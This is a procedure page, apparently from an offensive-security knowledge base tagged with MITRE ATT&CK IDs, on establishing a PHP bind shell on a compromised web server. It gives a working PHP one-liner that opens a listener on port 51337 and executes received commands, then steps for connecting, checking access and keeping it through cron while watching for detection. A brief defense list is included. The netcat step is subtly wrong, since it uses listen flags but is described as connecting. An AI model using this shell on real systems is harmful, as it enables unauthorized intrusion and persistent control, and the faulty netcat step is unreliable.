---
id: 76fb764c-6194-49a5-8b86-da80a71c1be6
name: Establish-PHP-Bind-Shell
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.802220+00:00'
updated_at: '2023-04-10T20:21:13.587694+00:00'
tactics:
  - '[[tactics/Command and Control|TA0011 - Command and Control]]'
techniques:
  - '[[techniques/Application-Layer-Protocol|T1071 - Application Layer Protocol]]'
sub_techniques:
  - '[[sub-techniques/Web-Protocols|T1071.001 - Web Protocols]]'
tags:
  - '[[tags/Bind Shell]]'
  - '[[tags/PHP]]'
commands:
  - '[[commands/php-execute-bind-shell]]'
  - '[[commands/netcat-listen-for-shell]]'
platforms:
  - Linux
  - Web
tools: []
validated: true
---

# Establish-PHP-Bind-Shell

## Summary

This procedure demonstrates how to establish a PHP bind shell on a compromised web server to provide remote command execution capabilities. By executing a PHP script that listens on a specified port, an attacker can connect to the target and interact with a shell, enabling post-exploitation activities such as data exfiltration or further lateral movement.

## Description

A PHP bind shell leverages PHP's socket functions to create a listening socket on the target web server. Once a connection is made from the attacker's machine (e.g., using netcat), the script spawns a process to handle command input and output, effectively providing a remote shell. This technique is commonly used after initial access via file upload vulnerabilities in web applications. It requires PHP execution privileges on the server and an open port for incoming connections. The bind shell differs from a reverse shell by having the target listen for connections rather than initiating outbound ones, which can be useful in firewalled environments where outbound connections are restricted but inbound to high ports are allowed. Success allows persistent command and control over the target system until the shell is discovered and removed.

## Requirements

1. Access to a web server with PHP enabled (version 5+ recommended for socket support).
2. Ability to upload or execute PHP code on the target (e.g., via file upload vulnerability or RCE).
3. Network connectivity from the attacker's machine to the target's IP on the chosen port (default 51337).
4. Netcat or similar tool on the attacker's machine to connect to the shell.

## Defense

- Implement web application firewalls (WAF) to block suspicious file uploads and PHP executions.
- Monitor server logs for unusual socket creations or process spawns from web processes (e.g., Apache/PHP-FPM).
- Restrict inbound network access to non-standard ports on web servers using firewalls.
- Enable PHP security extensions like Suhosin or disable dangerous functions (e.g., socket_create, popen) via php.ini.
- Regularly scan uploaded files for malicious code and use file integrity monitoring.

## Objectives

1. Deploy and execute a PHP script that binds a shell to a listening port on the target.
2. Establish a remote connection to interact with the target's command shell.
3. Maintain access for executing arbitrary commands and exploring the system.

## Instructions

### Step 1: Prepare and Execute the PHP Bind Shell Code

**Context**: Use the PHP one-liner to create a listening socket on the target. This can be executed directly via a command line if shell access is available, or embedded in a uploaded PHP file and triggered via a web request. The code binds to all interfaces (0.0.0.0) on port 51337 by default; adjust if needed for stealth.

**Code** ([[codes/PHP-Bind-Shell-One-Liner]]):

Execute using [[commands/php-execute-bind-shell]]:

```bash
php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",51337);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
```

> This command creates the socket, listens for connections, and handles command execution via popen. If executed in a web context, save it as a .php file and access via browser or curl to start the listener. Expected output: No immediate console output; the process hangs waiting for connections. Verify by checking netstat or ss for the listening port: `ss -tuln | grep 51337` should show the socket in LISTEN state.

### Step 2: Connect to the Bind Shell from Attacker Machine

**Context**: Once the PHP script is running and listening, connect from your machine to interact with the shell. This step assumes you have the target's IP and the port is reachable.

**Command** ([[commands/netcat-listen-for-shell]]):

```bash
nc -lvnp 51337 <target_ip>
```

> Replace <target_ip> with the actual IP of the compromised server. This connects to the listening port and provides an interactive shell prompt. Expected output: A shell prompt (`$ `) appears, allowing command input like `whoami` or `ls`. If connection fails, check firewall rules, port availability, or if the PHP process is still running.

### Step 3: Verify and Use the Shell

**Context**: Test the shell for functionality and stability. If the connection drops, re-execute the PHP code to restart the listener.

**Instructions**: After connecting, run basic commands to confirm access:

```bash
id
pwd
ls -la
```

> Expected output: System information confirming execution context (e.g., `uid=33(www-data)` for web server user). Success is indicated by responsive command output without errors. For persistence, consider saving the code to a file like `/tmp/bindshell.php` and cron-ing its execution, but monitor for detection.
